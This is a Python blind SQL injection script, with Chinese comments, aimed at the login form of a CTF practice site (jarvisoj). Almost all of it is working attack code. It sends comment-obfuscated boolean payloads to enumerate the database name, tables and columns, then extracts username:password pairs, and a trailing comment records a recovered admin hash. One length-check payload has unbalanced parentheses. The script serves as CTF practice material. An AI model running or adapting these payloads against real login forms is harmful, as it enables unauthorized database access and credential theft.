
# /usr/bin/env python3
# _*_ coding:utf-8 _*_
# auther: saucerman
# project: https://github.com/saucer-man/penetration-script
"""
登录盲注脚本
"""

import requests
url = "http://web.jarvisoj.com:32787/login.php" 

headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"}

# 爆破数据库名 
def get_database_name():
    # 爆破数据库长度 结果为 18 
    for len in range(1, 26):
        payload = "admin'/**/and/**/length(database())={l}/**/and'1".format(l=len)
        data = {
            'username': payload,
            'password': 'admin'
        }
        r = requests.post(url, data=data, headers=headers)
        length = r.headers['content-length']
        print("test-->" + str(len))
        if length == "1202":
            print("数据库长度为:%d"%len)
            break


    database_name = ''
    for l in range(1, len+1):
        for y in range(500):
            payload = "admin'/**/and/**/ascii(substr((select/**/database()),{l},1))={y}/**/and'1".format(l=l,y=y)
            data = {
                    'username': payload,
                    'password': 'admin'
            }
            r = requests.post(url, data=data, headers=headers)
            length = r.headers['content-length']
            if length == "1202":
                database_name = database_name + chr(y)
                print(database_name)
                break
    print("数据库名为:" + database_name)
    return database_name

# 爆表名
def get_table_name():
    for len in range(100):
        payload = "admin' and (select length((select group_concat(distinct table_name) from information_schema.columns where table_schema=database()))={l}) and'1".format(l=len)
        payload = payload.replace(' ','/**/')

        data = {
            'username': payload,
            'password': 'admin'
        }
        r = requests.post(url, data=data, headers=headers)
        length = r.headers['content-length']
        print("test-->" + str(len))
        if length == "1202":
            print("表长度为:%d"%len)
            break
    table_name = ''
    for l in range(1, len+1):
        for y in range(500):
            payload = "admin' and ascii(substr((select group_concat(distinct table_name) from information_schema.columns where table_schema=database()),{l},1))={y} and '1".format(l=l,y=y)  
            payload = payload.replace(' ','/**/')
            data = {
                'username': payload,
                'password': 'admin'
            }
            r = requests.post(url, data=data, headers=headers)
            length = r.headers['content-length']
            if length == "1202":
                table_name = table_name + chr(y)
                print(table_name)
                break
    print("表名为"+ table_name )
    return table_name

def get_culumn_name():
    for len in range(100):
        payload = "admin' and (select length((select group_concat(distinct column_name) from information_schema.columns where table_name=0x61646d696e))={l}) and'1".format(l=len)
        payload = payload.replace(' ','/**/')
        data = {
            'username': payload,
            'password': 'admin'
        }
        r = requests.post(url, data=data, headers=headers)
        length = r.headers['content-length']
        print("test-->" + str(len))
        if length == "1202":
            print("字段长度为:%d"%len)
            break

    column_name = ''
    for l in range(1, len+1):
        for y in range(500):
            payload = "admin' and ascii(substr((select group_concat(distinct column_name) from information_schema.columns where table_name=0x61646d696e),{l},1))={y} and '1".format(l=l,y=y)  
            payload = payload.replace(' ','/**/')
            data = {
                'username': payload,
                'password': 'admin'
            }
            r = requests.post(url, data=data, headers=headers)
            length = r.headers['content-length']
            if length == "1202":
                column_name = column_name + chr(y)
                print(column_name)
                break
    print("字段名为"+ column_name )
    return column_name  

def get_data():
    for len in range(100):
        payload = "admin' and (select group_concat(username,0x3a,password) from admin))={l}) and'1".format(l=len)
        payload = payload.replace(' ','/**/')
        data = {
            'username': payload,
            'password': 'admin'
        }
        r = requests.post(url, data=data, headers=headers)
        length = r.headers['content-length']
        print("test-->" + str(len))
        if length == "1202":
            print("数据长度为:%d"%len)
            break

    data_name = ''
    for l in range(1, len+1):
        for y in range(500):
            payload = "admin' and ascii(substr((select group_concat(username,0x3a,password) from admin),{l},1))={y} and '1".format(l=l,y=y)  
            payload = payload.replace(' ','/**/')
            data = {
                'username': payload,
                'password': 'admin'
            }
            r = requests.post(url, data=data, headers=headers)
            length = r.headers['content-length']
            if length == "1202":
                data_name = data_name + chr(y)
                print(data_name)
                break
    print("数据为"+ data_name )
    return data_name 
if __name__ == '__main__':
    # database_name = get_database_name()   injection
    # table_name = get_table_name() admin
    # column_name = get_culumn_name() id，username，password
    data = get_data() #  admin:334cfb59c9d74849801d5acdcfdaadc3